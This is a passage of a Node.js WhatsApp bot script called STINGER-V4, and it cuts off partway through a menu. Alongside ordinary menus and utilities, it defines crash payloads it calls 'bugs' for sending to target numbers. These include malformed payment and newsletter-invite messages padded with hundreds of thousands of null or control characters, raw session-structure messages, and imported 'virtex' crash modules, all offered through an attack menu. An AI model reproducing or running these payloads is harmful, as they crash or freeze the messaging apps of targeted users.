/*
 YANG SEBAR YATIM 
    AWOKAWOK
    
 # SCRIPT ORI ES TEAMS
 - DI LARANG RENAME
 - DI LARANG MEMPERJUAL
 - DI LARANG MEMPER SEBAR
 - DI LARANG MEREBUT ISTRI TETANGGA
 
 # THANK YOU
    ALWAYSAQIOO (ORG TERGANTENG)
    YANG UDAH SUPPORT ZYNXZO DARI 0
    SEMOGA KALIAN SEHAT SELALU
    
 # NOTE
    SEMOGA KALIAN MEMAHAMI LARANGAN DI ATAS
*/
module.exports = async (zyn, m, store) => {
try {
const from = m.key.remoteJid
const quoted = m.quoted ? m.quoted : m
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
const budy = (typeof m.text == 'string' ? m.text : '')

if (m.message) {

                             if (m.mtype === "LiveLocationMessage") {
                               newly = "\n".repeat(0x3e8);
                               await zyn.sendMessage(m.chat, {
                                 'text': newly
                               });
                               await zyn.sendMessage(zyn.user.id, {
                                 'text': m.sender.split('@')[0x0] + " 𝗧𝗵𝗶𝘀 𝘂𝘀𝗲𝗿 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗱𝗲𝘁𝗲𝗰𝘁𝗲𝗱 𝘀𝗲𝗻𝗱𝗶𝗻𝗴 𝗯𝘂𝗴𝘀 𝗶𝗻 𝗴𝗿𝗼𝘂𝗽𝘀 𝗼𝗿 𝗽𝗿𝗶𝘃𝗮𝘁𝗲 𝗺𝗲𝘀𝘀𝗮𝗴𝗲𝘀, 𝘀𝗼 𝗵𝗲 𝗼𝗿 𝘀𝗵𝗲 𝗶𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱☠️☠️☠️☠️☠️☠️𝗔𝗡𝗧𝗜𝗕𝗨𝗚 𝗕𝗟𝗢𝗖𝗞 𝗜𝗡𝗖𝗢𝗠𝗜𝗡𝗚 𝗕𝗨𝗚 𝗜𝗡 𝗚𝗥𝗢𝗨𝗣𝗦 𝗢𝗥 𝗣𝗠 █▓▒▒░░░𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐒𝐓𝐈𝐍𝐆𝐄𝐑-𝐕𝟒░░░▒▒▓█"
                               });
                               await zyn.updateBlockStatus(m.sender, "block");
                             }
                           }
                           
                           if (m.message) {
                                    if (m.mtype === "documentMessage") {
                                      newly = "\n".repeat(0x3e8);
                                      await zyn.sendMessage(m.chat, {
                                        'text': newly
                                      });
                                      await zyn.sendMessage(zyn.user.id, {
                                        'text': m.sender.split('@')[0x0] + " 𝗧𝗵𝗶𝘀 𝘂𝘀𝗲𝗿 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗱𝗲𝘁𝗲𝗰𝘁𝗲𝗱 𝘀𝗲𝗻𝗱𝗶𝗻𝗴 𝗯𝘂𝗴𝘀 𝗶𝗻 𝗴𝗿𝗼𝘂𝗽𝘀 𝗼𝗿 𝗽𝗿𝗶𝘃𝗮𝘁𝗲 𝗺𝗲𝘀𝘀𝗮𝗴𝗲𝘀, 𝘀𝗼 𝗵𝗲 𝗼𝗿 𝘀𝗵𝗲 𝗶𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱☠️☠️☠️☠️☠️☠️𝗔𝗡𝗧𝗜𝗕𝗨𝗚 𝗕𝗟𝗢𝗖𝗞 𝗜𝗡𝗖𝗢𝗠𝗜𝗡𝗚 𝗕𝗨𝗚 𝗜𝗡 𝗚𝗥𝗢𝗨𝗣𝗦 𝗢𝗥 𝗣𝗠 █▓▒▒░░░𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐒𝐓𝐈𝐍𝐆𝐄𝐑-𝐕𝟒░░░▒▒▓█"
                                      });
                                      await zyn.updateBlockStatus(m.sender, "block");
                                    }
                                  }
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const mime = (quoted.msg || quoted).mimetype || ''
const text = q = args.join(" ")
const isGroup = from.endsWith('@g.us')
const botNumber = await zyn.decodeJid(zyn.user.id)
const sender = m.key.fromMe ? (zyn.user.id.split(':')[0]+'@s.whatsapp.net' || zyn.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await zyn.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const totalFitur = () =>{
            var mytext = fs.readFileSync("./STINGER-V4.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
const isAdmins = isGroup ? groupAdmins.includes(sender) : false
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const { Client } = require('ssh2');
const jsobfus = require('javascript-obfuscator');
const { addSaldo, minSaldo, cekSaldo } = require("./database/dtbs/deposit");
const { mediafireDl } = require('./database/dtbs/mediafire.js') 
let db_saldo = JSON.parse(fs.readFileSync("./database/dtbs/saldo.json"));
const { beta1, beta2, buk1 } = require("./database/lib/hdr.js")
const xbug = fs.readFileSync(`./database/image/ES_TEAMS.jpg`)
const Xynz = fs.readFileSync(`./database/image/STINGER-V4.jpg`) 
const zkosong = fs.readFileSync(`./database/image/PASCHAL.png`)

const bugres = '𝐒𝐓𝐈𝐍𝐆𝐄𝐑-𝐕𝟒 𝐈𝐍 𝐏𝐑𝐎𝐂𝐄𝐒𝐒'

// VIRTEX
		const {
			ios
		} = require("./database/virtex/ios.js")
		const {
			telapreta3
		} = require("./database/virtex/telapreta3.js")
		const {
			convite
		} = require("./database/virtex/convite.js")
		const {
			bugpdf
		} = require("./database/virtex/bugpdf.js")
		const {
			cP
		} = require('./database/virtex/bugUrl.js')
	
	
// Auto Blocked Nomor +212
if (m.sender.startsWith('212')) return zyn.updateBlockStatus(m.sender, 'block')

// Random Color
const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]

let run = runtime(process.uptime())


// Command Yang Muncul Di Console
if (isCmd) {
console.log(chalk.white.bgRed.bold('Ada Pesan, Om'), color(`[ 𝐒𝐓𝐈𝐍𝐆𝐄𝐑-𝐕𝟒 ]`, `green`), color(`FROM`, `red`), color(`${pushname}`, `red`), color(`Text :`, `yellow`), color(`${body}`, `blue`))
}

        // Days
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('HH : mm :ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if (time2 < "23:59:00") {
            var ucapanWaktu = 'Good Morning Beautiful/Handsome 🏙️'
        }
        if (time2 < "19:00:00") {
            var ucapanWaktu = 'Good evening🌆'
        }
        if (time2 < "18:00:00") {
            var ucapanWaktu = 'Good Morning 🌇'
        }
        if (time2 < "15:00:00") {
            var ucapanWaktu = 'Good afternoon 🌤️'
        }
        if (time2 < "10:00:00") {
            var ucapanWaktu = 'Good evening 🌄'
        }
        if (time2 < "05:00:00") {
            var ucapanWaktu = 'Good evening🌆'
        }
        if (time2 < "03:00:00") {
            var ucapanWaktu = 'Good night🌃'
        }
       
    zyn.autoshalat = zyn.autoshalat ? zyn.autoshalat : {}
    let id = m.chat
    if (id in zyn.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:29',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '12:02',
    ashar: '15:15',
    magrib: '17:52',
    isya: '19:01',
    }
    const datek = new Date((new Date).toLocaleString("en-US", {
    timeZone: "Asia/Jakarta"
    }));
    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
    for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if (timeNow === waktu) {
        zyn.autoshalat[id] = [
            zyn.sendMessage(m.chat, {
audio: {
    url: 'https://www.bandlab.com/post/f6dbf314-2683-ef11-8474-6045bd375453'
},
mimetype: 'audio/mp4',
ptt: true,
contextInfo: {
    externalAdReply: {
        showAdAttribution: true,
        mediaType: 1,
        mediaUrl: '',
        title: `𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐈𝐒 𝐀𝐂𝐓𝐈𝐕𝐄 ${sholat}`,
        body: `❄ ${waktu}`,
        sourceUrl: '',
        thumbnail: await fs.readFileSync('./database/image/STINGER.jpg'),
        renderLargerThumbnail: true
    }
}
            }, {}),
            setTimeout(async () => {
delete client.autoshalat[m.chat]
            }, 57000)
        ]
    }
    }

// Read Database
const contacts = JSON.parse(fs.readFileSync("./database/dtbs/contacts.json"))
const prem = JSON.parse(fs.readFileSync("./database/dtbs/premium.json"))
const ownerNumber = JSON.parse(fs.readFileSync("./database/dtbs/owner.json"))

// Cek Database
const isContacts = contacts.includes(sender)
const isPremium = prem.includes(sender)
const isOwner = ownerNumber.includes(senderNumber) || isBot

// BUTTON VIDEO
   zyn.sendButtonVideo = async (jid, buttons, quoted, opts = {}) => {
      var video = await prepareWAMessageMedia({
         video: {
            url: opts && opts.video ? opts.video : ''
         }
      }, {
         upload: zyn.waUploadToServer
      })
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
  body: {
     text: opts && opts.body ? opts.body : ''
  },
  footer: {
     text: opts && opts.footer ? opts.footer : ''
  },
  header: {
     hasMediaAttachment: true,
     videoMessage: video.videoMessage,
  },
  nativeFlowMessage: {
     buttons: buttons,
     messageParamsJson: ''
  }, contextInfo: {
      externalAdReply: {
      title: global.namabot,
      body: `By ES TEAMS`,
      thumbnailUrl: global.imageurl,
      sourceUrl: global.isLink,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
               
               }
            }
         }
      }, {
         quoted
      })
      await zyn.sendPresenceUpdate('composing', jid)
      return zyn.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }
		    
		async function sendQP(target, filterName, parameters, filterResult, clientNotSupportedConfig, clauseType, clauses, filters) {
    var qpMessage = generateWAMessageFromContent(target, proto.Message.fromObject({
        'qp': {
            'filter': {
                'filterName': filterName,
                'parameters': parameters,
                'filterResult': filterResult,
                'clientNotSupportedConfig': clientNotSupportedConfig
            },
            'filterClause': {
                'clauseType': clauseType,
                'clauses': clauses,
                'filters': filters
            }
        }
    }), { userJid: target });

    await zyn.relayMessage(target, qpMessage.message, { participant: { jid: target }, messageId: qpMessage.key.id });
}
		    
		async function sendSessionStructure(target, sessionVersion, localIdentityPublic, remoteIdentityPublic, rootKey, previousCounter, senderChain, receiverChains, pendingKeyExchange, pendingPreKey, remoteRegistrationId, localRegistrationId, needsRefresh, aliceBaseKey) {
    var sessionStructure = generateWAMessageFromContent(target, proto.Message.fromObject({
        'sessionStructure': {
            'sessionVersion': sessionVersion,
            'localIdentityPublic': localIdentityPublic,
            'remoteIdentityPublic': remoteIdentityPublic,
            'rootKey': rootKey,
            'previousCounter': previousCounter,
            'senderChain': senderChain,
            'receiverChains': receiverChains,
            'pendingKeyExchange': pendingKeyExchange,
            'pendingPreKey': pendingPreKey,
            'remoteRegistrationId': remoteRegistrationId,
            'localRegistrationId': localRegistrationId,
            'needsRefresh': needsRefresh,
            'aliceBaseKey': aliceBaseKey
        }
    }), { userJid: target });

    await zyn.relayMessage(target, sessionStructure.message, { participant: { jid: target }, messageId: sessionStructure.key.id });
}
		
const wanted = {
            key: {
                remoteJid: 'p',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "Sent",
                        "format": "DEFAULT"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }	
		
		
		async function PayMent(LockJids) {
			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						'interactiveMessage': {
							'header': {
								"hasMediaAttachment": true,
								'sequenceNumber': '0',
								"jpegThumbnail": ""
							},
							'nativeFlowMessage': {
								"buttons": [{
									"name": "review_and_pay",
									"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\k${bugpdf},\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
								}],
								"messageParamsJson": '\0'.repeat(10000),
							}
						}
					}
				}
			}), {});
			zyn.relayMessage(LockJids, messageContent.message, {
				'messageId': messageContent.key.id
			});
		}

		async function NewsletterZap(LockJids) {
			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						"newsletterAdminInviteMessage": {
							"newsletterJid": `120363313305181359@newsletter`,
							"newsletterName": "Zynxzo Script" + "\u0000".repeat(920000),
							"jpegThumbnail": "",
							"caption": `Undangan Admin Channel Zynxzo Script`,
							"inviteExpiration": Date.now() + 1814400000
						}
					}
				}
			}), {
				'userJid': LockJids
			});
			await zyn.relayMessage(LockJids, messageContent.message, {
				'participant': {
					'jid': LockJids
				},
				'messageId': messageContent.key.id
			});
		}

		const Porke = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
						"jpegThumbnail": fs.readFileSync(`./database/image/PASCHAL.png`)
					},
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰𝐙𝐲𝐧 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
		}

		const Porke2 = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
						"jpegThumbnail": fs.readFileSync(`./database/image/PASCHAL.png`)
					},
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰𝐙𝐲𝐧 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
		}

let list = []
for (let i of ownerNumber) {
list.push({
displayName: await zyn.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await zyn.getName(i + '@s.whatsapp.net')}\n
FN:${await zyn.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET: examsolutionteam@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://whatsapp.com/channel/0029Vaj1vKSK5cDDT4tVvY1y
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}

function monospace(string) {
return '```' + string + '```'
}

   function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
 
// Gak Usah Di Apa Apain Jika Tidak Mau Error
try {
ppuser = await zyn.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}

// FUNCTION OBFUSCATOR 
async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `zyn`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}
 
//Status
if (!zyn.public) {
if (!m.key.fromMe) return
} 

async function loading () {
var baralod = [
"> ❄️S❄️",
"> ❄️ST❄️",
"> ❄️STI❄️",
"> ❄️STIN❄️",
"> ❄️STING❄️",
"> ❄️STINGE❄️",
"> ❄️STINGER❄️",
]
let { key } = await zyn.sendMessage(from, {text: ' S҉'})

for (let i = 0; i < baralod.length; i++) {
await zyn.sendMessage(from, {text: baralod[i], edit: key });
}
}

// Fake Resize
const fkethmb = await reSize(ppuser, 300, 300)

// Cuma Fake
const sendOrder = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
"orderMessage": {
"orderId": orid,
"thumbnail": img,
"itemCount": itcount,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": title,
"message": text,
"sellerJid": sellers,
"token": tokens,
"totalAmount1000": ammount,
"totalCurrencyCode": "IDR",
}
}), { userJid: jid, quoted: m })
zyn.relayMessage(jid, order.message, { messageId: order.key.id})
}

// Function Reply
const reply = (teks) => {
            zyn.sendMessage(m.chat,
{
    text: teks,
    contextInfo: {
        mentionedJid: [sender],
        forwardingScore: 9999999,
        isForwarded: true,
        "externalAdReply": {
            "showAdAttribution": true,
            "containsAutoReply": true,
            "title": ` S҉ T҉ I҉ N҉ G҉ E҉ R҉`,
            "body": `${namabot}`,
            "previewType": "PHOTO",
            "thumbnailUrl": ``,
            "thumbnail": fs.readFileSync(`./database/image/STINGER-V4.jpg`),
            "sourceUrl": `${isLink}`
        }
    }
},
{ quoted: m })
        }

const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }}}}
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}
    
if (m.isGroup && !m.key.fromMe && !isOwner && antilink) {
if (!isBotAdmins) return
if (budy.match(`whatsapp.com`)) {
zyn.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
zyn.groupParticipantsUpdate(m.chat, [sender], 'delete')
zyn.sendMessage(m.chat, { delete: m.key })
}
}

switch (command) {

case 'stinger': {
await loading()
darkphonk = fs.readFileSync('./database/ES_TEAMS.mp3')
const version = require("baileys/package.json").version
const menu = `╭━━━━━━❄️◁️🕷️ S҉T҉I҉N҉G҉E҉R҉- V҉ 4҉━━━━━━╮
┃❁️ _ᴏᴡɴᴇʀ:_ ᴇꜱ ᴛᴇᴀᴍꜱ ᴛᴇᴄʜ🚀👽
┃❁️ _ᴠᴇʀꜱɪᴏɴ:_ ${versisc} 🔝💻
┃❁️ _ᴍᴏᴅᴇʟ:_ ${namabot} 🤖💸
┃❁️ _ᴜᴘᴛɪᴍᴇ:_ ${runtime(process.uptime())} ⏰🔋
╰━━━━━━❄️◁️🕷️━━━━━━╯`
let sections = [{
title: '⿻  ⌜ 𝐒𝐓𝐈𝐍𝐆𝐄𝐑-𝐕𝟒 ⌟  ⿻',
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐌𝐄𝐍𝐔',
rows: [{
title: '❄️🆂🆃🅸🅽🅶🅴🆁 🅰🅻🅻❄️', 
id: '.stinger-v4'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑-𝐕𝟒 𝐁𝐔𝐆',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅰🆃🆃🅰🅲🅺❄️', 
id: '.stinger-bug'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑  𝐀𝐍𝐓𝐈𝐁𝐔𝐆',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅰🅽🆃🅸🅱🆄🅶❄️', 
id: '.sting-antibug'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐒𝐓𝐎𝐑𝐄',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🆂🆃🅾🆁🅴❄️', 
id: '.storemenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐍𝐄𝐖',
rows: [{
title: '❄️🆂🆃🅸🅽🅶🅴🆁 🅿🅻🆄🆂❄️', 
id: '.sting-plus'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐏𝐀𝐍𝐄𝐋',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅿🅰🅽🅴🅻❄️', 
id: '.panelmenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐓𝐎𝐎𝐋𝐒',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🆃🅾🅾🅻🆂❄️', 
id: '.toolsmenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐁𝐀𝐍𝐍𝐄𝐑',
rows: [{
title: '❄️🆂🆃🅸🅽🅶  🅱🅰🅽❄️', 
id: '.stinger-banner'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐆𝐑𝐎𝐔𝐏',
rows: [{
title: '❄️🆂🆃🅸🅽🅶 🅶🆁🅾🆄🅿❄️', 
id: '.groupmenu'
}]
},
{
highlight_label: '𝐒𝐓𝐈𝐍𝐆𝐄𝐑-𝐕𝟒️',
rows: [{
title: '❄️🅴🆂 🆃🅴🅰🅼🆂❄️', 
id: '.esteams'
}]
}]
let listMessage = {
    title: '❄️𝐒𝐓𝐈𝐍𝐆𝐄𝐑-𝐕𝟒❄️', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: menu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/STINGER-V4.jpg")}, { upload: zyn.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"❄️𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐂𝐇𝐀𝐍𝐍𝐄𝐋❄️\",\"url\":\"https://whatsapp.com/channel/0029Vaj1vKSK5cDDT4tVvY1y\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vaj1vKSK5cDDT4tVvY1y\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await zyn.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
await zyn.sendMessage(m.chat, {audio: darkphonk, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break

case 'panelmenu': {
await loading()
const version = require("baileys/package.json").version
const panelmenu = `╭━━━━━━❄️◁️🕷️ S҉T҉I҉N҉G҉E҉R҉- V҉ 4҉━━━━━━╮
┃❁️ _ᴏᴡɴᴇʀ:_ ᴇꜱ ᴛᴇᴀᴍꜱ ᴛᴇᴄʜ🚀👽
┃❁️ _ᴠᴇʀꜱɪᴏɴ:_ ${versisc} 🔝💻
┃❁️ _ᴍᴏᴅᴇʟ:_ ${namabot} 🤖💸
┃❁️ _ᴜᴘᴛɪᴍᴇ:_ ${runtime(process.uptime())} ⏰🔋
╰━━━━━━❄️◁️🕷️━━━━━━╯​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​
╰⭑➤➤⭑➤➤⭑➤ 𝐏𝐀𝐍𝐄𝐋 𝐌𝐄𝐍𝐔
> ᯤ 1ɢʙ ◁️❄️🕷️
> ᯤ 2ɢʙ ◁️❄️🕷️
> ᯤ 3ɢʙ ◁️❄️🕷️
> ᯤ 4ɢʙ ◁️❄️🕷️
> ᯤ 5ɢʙ ◁️❄️🕷️
> ᯤ 6ɢʙ ◁️❄️🕷️
> ᯤ 7ɢʙ ◁️❄️🕷️
> ᯤ 8ɢʙ ◁️❄️🕷️
> ᯤ 9ɢʙ ◁️❄️🕷️
> ᯤ ᴜɴʟɪ ◁️❄️🕷️
> ᯤ ʟɪsᴛsʀᴠ ◁️❄️🕷️
> ᯤ ᴅᴇʟsʀᴠ ◁️❄️🕷️`
let sections = [{
